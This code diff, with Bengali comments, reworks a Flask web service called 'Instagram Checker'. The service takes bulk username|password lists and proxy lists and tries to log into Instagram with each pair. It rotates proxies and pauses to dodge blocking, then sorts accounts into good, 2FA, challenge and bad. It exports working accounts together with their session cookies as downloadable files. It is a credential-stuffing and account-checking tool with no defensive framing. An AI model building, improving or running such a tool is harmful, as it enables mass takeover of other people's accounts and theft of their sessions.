@@ -11,6 +11,7 @@ import threading
 import tempfile
 import zipfile
 from io import BytesIO
+import traceback
 
 app = Flask(__name__)
 CORS(app)
@@ -24,162 +25,81 @@ class InstagramChecker:
         self.current_proxy_index = 0
         
     def get_next_proxy(self):
-        """পরবর্তী প্রক্সি সিলেক্ট করুন (রাউন্ড রবিন)"""
+        """পরবর্তী প্রক্সি সিলেক্ট করুন"""
         if not self.proxies:
             return None
-        
         proxy = self.proxies[self.current_proxy_index]
         self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
         return proxy
     
-    def validate_proxy(self, proxy):
-        """প্রক্সি ভ্যালিড কিনা চেক করুন"""
-        if not proxy or proxy == '':
-            return True
-        
+    async def check_account(self, username, password):
+        """একাউন্ট চেক করার মেইন ফাংশন"""
         try:
-            import requests
-            test_session = requests.Session()
-            test_session.proxies = {'http': proxy, 'https': proxy}
-            test_session.timeout = 5
-            response = test_session.get('http://httpbin.org/ip', timeout=5)
-            return response.status_code == 200
-        except:
-            return False
-    
-    async def check_with_instagrapi(self, username, password, proxy=None):
-        """instagrapi দিয়ে চেক"""
-        try:
-            from instagrapi import Client
-            from instagrapi.exceptions import (
-                LoginRequired, ChallengeRequired, TwoFactorRequired,
-                BadPassword, ClientError, ProxyError
-            )
+            # instagrapi ইম্পোর্ট এখানে করছি (error handling সহ)
+            try:
+                from instagrapi import Client
+                from instagrapi.exceptions import LoginRequired, ChallengeRequired, TwoFactorRequired, BadPassword, ClientError
+            except ImportError as e:
+                return {
+                    'status': 'error',
+                    'error': f'instagrapi import error: {str(e)}. Run: pip install instagrapi'
+                }
             
+            proxy = self.get_next_proxy()
             cl = Client()
+            
             if proxy:
                 try:
                     cl.set_proxy(proxy)
-                except Exception as e:
-                    return {'status': 'proxy_error', 'error': f'Proxy error: {str(e)}', 'method': 'instagrapi'}
+                except:
+                    pass
             
-            cl.delay_range = [1, 2]
+            # লগিন করার চেষ্টা
             cl.login(username, password)
             await asyncio.sleep(1)
             
+            # সেশন ডাটা নেওয়া
             session_data = cl.get_session_data()
-            cookie_string = f"sessionid={session_data.get('sessionid', '')}; "
-            cookie_string += f"csrftoken={session_data.get('csrftoken', '')}; "
-            cookie_string += f"ds_user_id={session_data.get('ds_user_id', '')}"
+            
+            # কুকি স্ট্রিং বানানো
+            cookie_parts = []
+            if session_data.get('sessionid'):
+                cookie_parts.append(f"sessionid={session_data['sessionid']}")
+            if session_data.get('csrftoken'):
+                cookie_parts.append(f"csrftoken={session_data['csrftoken']}")
+            if session_data.get('ds_user_id'):
+                cookie_parts.append(f"ds_user_id={session_data['ds_user_id']}")
+            
+            cookie_string = '; '.join(cookie_parts)
             
             return {
                 'status': 'success',
                 'cookie': cookie_string,
-                'method': 'instagrapi',
+                'username': username,
                 'proxy_used': proxy if proxy else 'direct'
             }
             
-        except TwoFactorRequired:
-            return {'status': '2fa', 'method': 'instagrapi'}
-        except ChallengeRequired:
-            return {'status': 'challenge', 'method': 'instagrapi'}
-        except BadPassword:
-            return {'status': 'bad_password', 'method': 'instagrapi'}
-        except ProxyError:
-            return {'status': 'proxy_error', 'error': 'Proxy connection failed', 'method': 'instagrapi'}
         except Exception as e:
-            return {'status': 'error', 'error': str(e), 'method': 'instagrapi'}
-    
-    async def check_with_requests(self, username, password, proxy=None):
-        """requests দিয়ে চেক (ফাস্ট)"""
-        try:
-            import requests
+            error_str = str(e)
             
-            session = requests.Session()
-            if proxy:
-                try:
-                    session.proxies = {'http': proxy, 'https': proxy}
-                except Exception as e:
-                    return {'status': 'proxy_error', 'error': f'Proxy error: {str(e)}', 'method': 'requests'}
-            
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
-                'Accept': '*/*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'X-Instagram-AJAX': '1',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Origin': 'https://www.instagram.com',
-                'Connection': 'keep-alive',
-                'Host': 'www.instagram.com'
-            }
-            
-            # CSRF টোকেন নেওয়া
-            session.get('https://www.instagram.com/', headers=headers, timeout=10)
-            await asyncio.sleep(1)
-            
-            login_data = {
-                'username': username,
-                'password': password,
-                'queryParams': '{}',
-                'optIntoOneTap': 'false'
-            }
-            
-            response = session.post(
-                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                data=login_data,
-                headers=headers,
-                timeout=10
-            )
-            
-            result = response.json()
-            
-            if result.get('authenticated'):
-                cookies = session.cookies.get_dict()
-                cookie_string = '; '.join([f"{k}={v}" for k, v in cookies.items()])
-                
-                return {
-                    'status': 'success',
-                    'cookie': cookie_string,
-                    'method': 'requests',
-                    'proxy_used': proxy if proxy else 'direct'
-                }
-            elif result.get('two_factor_required'):
-                return {'status': '2fa', 'method': 'requests'}
-            elif result.get('checkpoint_url'):
-                return {'status': 'challenge', 'method': 'requests'}
+            # বিভিন্ন error চেক করা
+            if 'two_factor' in error_str.lower() or '2fa' in error_str.lower():
+                return {'status': '2fa', 'username': username, 'error': '2FA Required'}
+            elif 'challenge' in error_str.lower():
+                return {'status': 'challenge', 'username': username, 'error': 'Challenge Required'}
+            elif 'password' in error_str.lower() or 'wrong' in error_str.lower():
+                return {'status': 'bad_password', 'username': username, 'error': 'Wrong Password'}
+            elif 'proxy' in error_str.lower():
+                return {'status': 'proxy_error', 'username': username, 'error': f'Proxy Error: {error_str}'}
             else:
-                return {'status': 'bad_password', 'method': 'requests'}
-                
-        except requests.exceptions.ProxyError:
-            return {'status': 'proxy_error', 'error': 'Proxy connection failed', 'method': 'requests'}
-        except requests.exceptions.Timeout:
-            return {'status': 'proxy_error', 'error': 'Proxy timeout', 'method': 'requests'}
-        except Exception as e:
-            return {'status': 'error', 'error': str(e), 'method': 'requests'}
-    
-    async def check_account(self, username, password):
-        """একটি একাউন্ট চেক করা - অটো প্রক্সি সিলেক্ট"""
-        
-        # পরবর্তী প্রক্সি নিন
-        proxy = self.get_next_proxy()
-        
-        # প্রথমে requests দিয়ে চেষ্টা
-        result = await self.check_with_requests(username, password, proxy)
-        
-        # যদি fails বা proxy error, instagrapi দিয়ে চেষ্টা
-        if result['status'] in ['error', 'proxy_error']:
-            result = await self.check_with_instagrapi(username, password, proxy)
-        
-        return result
+                return {'status': 'error', 'username': username, 'error': error_str}
 
 async def process_batch(credentials_list, job_id, proxy_list=None):
-    """ব্যাচ প্রসেসিং - ইউজারের দেওয়া প্রক্সি ব্যবহার করে"""
+    """ব্যাচ প্রসেসিং"""
     
     checker = InstagramChecker(proxy_list)
     total = len(credentials_list)
-    batch_size = 5  # একসাথে ৫টা করে চেক
+    batch_size = 3  # একসাথে ৩টা করে চেক (কমিয়ে দিলাম error এড়াতে)
     
     jobs[job_id]['progress'] = 0
     jobs[job_id]['status'] = 'processing'
@@ -190,38 +110,39 @@ async def process_batch(credentials_list, job_id, proxy_list=None):
         
         for cred in batch:
             if '|' in cred:
+                parts = cred.split('|', 1)
+                if len(parts) == 2:
+                    username, password = parts
+                    tasks.append(checker.check_account(username.strip(), password.strip()))
+        
+        if tasks:
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            for cred, result in zip(batch, batch_results):
+                if '|' not in cred:
+                    continue
+                    
                 username, password = cred.split('|', 1)
-                tasks.append(checker.check_account(username.strip(), password.strip()))
-        
-        # একসাথে ব্যাচ চেক
-        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # রেজাল্ট প্রসেস
-        for cred, result in zip(batch, batch_results):
-            if '|' not in cred:
-                continue
                 
-            username, password = cred.split('|', 1)
-            
-            if isinstance(result, Exception):
-                jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {str(result)}")
-                continue
-            
-            if result['status'] == 'success':
-                jobs[job_id]['results']['good'].append(f"{username}|{password}|{result['cookie']}|Proxy: {result.get('proxy_used', 'unknown')}")
-            elif result['status'] == '2fa':
-                jobs[job_id]['results']['2fa'].append(f"{username}|{password}|2FA_REQUIRED")
-            elif result['status'] == 'challenge':
-                jobs[job_id]['results']['challenge'].append(f"{username}|{password}|CHALLENGE_REQUIRED")
-            elif result['status'] == 'bad_password':
-                jobs[job_id]['results']['bad'].append(f"{username}|{password}|BAD_PASSWORD")
-            elif result['status'] == 'proxy_error':
-                jobs[job_id]['results']['error'].append(f"{username}|{password}|PROXY_ERROR: {result.get('error', 'Unknown')}")
-            else:
-                jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {result.get('error', 'Unknown')}")
+                if isinstance(result, Exception):
+                    jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {str(result)}")
+                    continue
+                
+                if result.get('status') == 'success':
+                    jobs[job_id]['results']['good'].append(f"{username}|{password}|{result.get('cookie', '')}")
+                elif result.get('status') == '2fa':
+                    jobs[job_id]['results']['2fa'].append(f"{username}|{password}|2FA_REQUIRED")
+                elif result.get('status') == 'challenge':
+                    jobs[job_id]['results']['challenge'].append(f"{username}|{password}|CHALLENGE_REQUIRED")
+                elif result.get('status') == 'bad_password':
+                    jobs[job_id]['results']['bad'].append(f"{username}|{password}|BAD_PASSWORD")
+                elif result.get('status') == 'proxy_error':
+                    jobs[job_id]['results']['error'].append(f"{username}|{password}|PROXY_ERROR: {result.get('error', 'Unknown')}")
+                else:
+                    jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {result.get('error', 'Unknown')}")
         
         # প্রোগ্রেস আপডেট
-        jobs[job_id]['progress'] = int((i + len(batch)) / total * 100)
+        jobs[job_id]['progress'] = int((i + len(batch)) / total * 100) if total > 0 else 0
         jobs[job_id]['details'] = {
             'good': len(jobs[job_id]['results']['good']),
             '2fa': len(jobs[job_id]['results']['2fa']),
@@ -231,13 +152,17 @@ async def process_batch(credentials_list, job_id, proxy_list=None):
         }
         
         # বিরতি (ব্লক এড়াতে)
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
     
     jobs[job_id]['status'] = 'completed'
 
 def run_async_process(credentials, job_id, proxy_list):
     """Async ফাংশন রান করার জন্য হেল্পার"""
-    asyncio.run(process_batch(credentials, job_id, proxy_list))
+    try:
+        asyncio.run(process_batch(credentials, job_id, proxy_list))
+    except Exception as e:
+        jobs[job_id]['status'] = 'error'
+        jobs[job_id]['results']['error'].append(f"SYSTEM_ERROR|SYSTEM|ERROR: {str(e)}")
 
 @app.route('/')
 def index():
@@ -245,45 +170,49 @@ def index():
 
 @app.route('/api/submit', methods=['POST'])
 def submit():
-    data = request.json
-    credentials = data.get('credentials', '').strip().split('\n')
-    credentials = [c.strip() for c in credentials if c.strip()]
+    try:
+        data = request.json
+        credentials = data.get('credentials', '').strip().split('\n')
+        credentials = [c.strip() for c in credentials if c.strip()]
+        
+        # প্রক্সি লিস্ট প্রসেস
+        proxy_input = data.get('proxies', '').strip()
+        proxy_list = []
+        
+        if proxy_input:
+            proxy_lines = proxy_input.split('\n')
+            for line in proxy_lines:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    proxy_list.append(line)
+        
+        if not credentials:
+            return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
+        
+        job_id = datetime.now().strftime("%Y%m%d%H%M%S")
+        jobs[job_id] = {
+            'status': 'pending',
+            'progress': 0,
+            'results': {
+                'good': [],
+                '2fa': [],
+                'challenge': [],
+                'bad': [],
+                'error': []
+            },
+            'details': {},
+            'total': len(credentials),
+            'proxy_count': len(proxy_list)
+        }
+        
+        # ব্যাকগ্রাউন্ডে প্রসেসিং শুরু
+        thread = threading.Thread(target=run_async_process, args=(credentials, job_id, proxy_list))
+        thread.start()
+        
+        return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})
     
-    # প্রক্সি লিস্ট প্রসেস
-    proxy_input = data.get('proxies', '').strip()
-    proxy_list = []
-    
-    if proxy_input:
-        proxy_lines = proxy_input.split('\n')
-        for line in proxy_lines:
-            line = line.strip()
-            if line and not line.startswith('#'):
-                proxy_list.append(line)
-    
-    if not credentials:
-        return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
-    
-    job_id = datetime.now().strftime("%Y%m%d%H%M%S")
-    jobs[job_id] = {
-        'status': 'pending',
-        'progress': 0,
-        'results': {
-            'good': [],
-            '2fa': [],
-            'challenge': [],
-            'bad': [],
-            'error': []
-        },
-        'details': {},
-        'total': len(credentials),
-        'proxy_count': len(proxy_list)
-    }
-    
-    # ব্যাকগ্রাউন্ডে প্রসেসিং শুরু
-    thread = threading.Thread(target=run_async_process, args=(credentials, job_id, proxy_list))
-    thread.start()
-    
-    return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/status/<job_id>')
 def status(job_id):
@@ -301,61 +230,67 @@ def status(job_id):
 @app.route('/api/download/<job_id>/<type>')
 def download(job_id, type):
     """আলাদা ফাইল ডাউনলোড"""
-    if job_id not in jobs or jobs[job_id]['status'] != 'completed':
-        return jsonify({'error': 'File not ready'}), 400
-    
-    valid_types = ['good', '2fa', 'challenge', 'bad', 'error']
-    if type not in valid_types:
-        return jsonify({'error': 'Invalid type'}), 400
-    
-    results = jobs[job_id]['results'][type]
-    
-    if not results:
-        return jsonify({'error': 'No results for this category'}), 404
-    
-    filename = f"{type}_accounts_{job_id}.txt"
-    with open(filename, 'w', encoding='utf-8') as f:
-        for result in results:
-            f.write(result + '\n')
-    
-    return send_file(filename, as_attachment=True, download_name=filename)
-
-@app.route('/api/download/all/<job_id>')
-def download_all(job_id):
-    """সব ফাইল একসাথে জিপ করে ডাউনলোড"""
-    if job_id not in jobs or jobs[job_id]['status'] != 'completed':
-        return jsonify({'error': 'Files not ready'}), 400
-    
-    memory_file = BytesIO()
-    with zipfile.ZipFile(memory_file, 'w') as zf:
-        for category in ['good', '2fa', 'challenge', 'bad', 'error']:
-            results = jobs[job_id]['results'][category]
-            if results:
-                content = '\n'.join(results)
-                zf.writestr(f"{category}_accounts.txt", content)
+    try:
+        if job_id not in jobs:
+            return jsonify({'error': 'Job not found'}), 404
         
-        # রিপোর্ট ফাইল
-        report = f"""Instagram Checker Report
+        valid_types = ['good', '2fa', 'challenge', 'bad', 'error', 'all']
+        
+        if type == 'all':
+            # সব ক্যাটাগরি একসাথে
+            memory_file = BytesIO()
+            with zipfile.ZipFile(memory_file, 'w') as zf:
+                for category in ['good', '2fa', 'challenge', 'bad', 'error']:
+                    results = jobs[job_id]['results'][category]
+                    if results:
+                        content = '\n'.join(results)
+                        zf.writestr(f"{category}_accounts.txt", content)
+                
+                # রিপোর্ট
+                report = f"""Instagram Checker Report
 Job ID: {job_id}
 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 Total Accounts: {jobs[job_id]['total']}
 Proxies Used: {jobs[job_id].get('proxy_count', 0)}
 
-Results Summary:
+Results:
 - Good: {len(jobs[job_id]['results']['good'])}
-- 2FA Required: {len(jobs[job_id]['results']['2fa'])}
-- Challenge Required: {len(jobs[job_id]['results']['challenge'])}
+- 2FA: {len(jobs[job_id]['results']['2fa'])}
+- Challenge: {len(jobs[job_id]['results']['challenge'])}
 - Bad Password: {len(jobs[job_id]['results']['bad'])}
 - Errors: {len(jobs[job_id]['results']['error'])}
 """
-        zf.writestr("report.txt", report)
-    
-    memory_file.seek(0)
-    return send_file(
-        memory_file,
-        download_name=f'all_results_{job_id}.zip',
-        as_attachment=True
-    )
+                zf.writestr("report.txt", report)
+            
+            memory_file.seek(0)
+            return send_file(
+                memory_file,
+                download_name=f'all_results_{job_id}.zip',
+                as_attachment=True,
+                mimetype='application/zip'
+            )
+        
+        elif type in valid_types:
+            results = jobs[job_id]['results'][type]
+            
+            if not results:
+                return jsonify({'error': 'No results for this category'}), 404
+            
+            filename = f"{type}_accounts_{job_id}.txt"
+            content = '\n'.join(results)
+            
+            return send_file(
+                BytesIO(content.encode('utf-8')),
+                download_name=filename,
+                as_attachment=True,
+                mimetype='text/plain'
+            )
+        
+        else:
+            return jsonify({'error': 'Invalid type'}), 400
+            
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(debug=True)
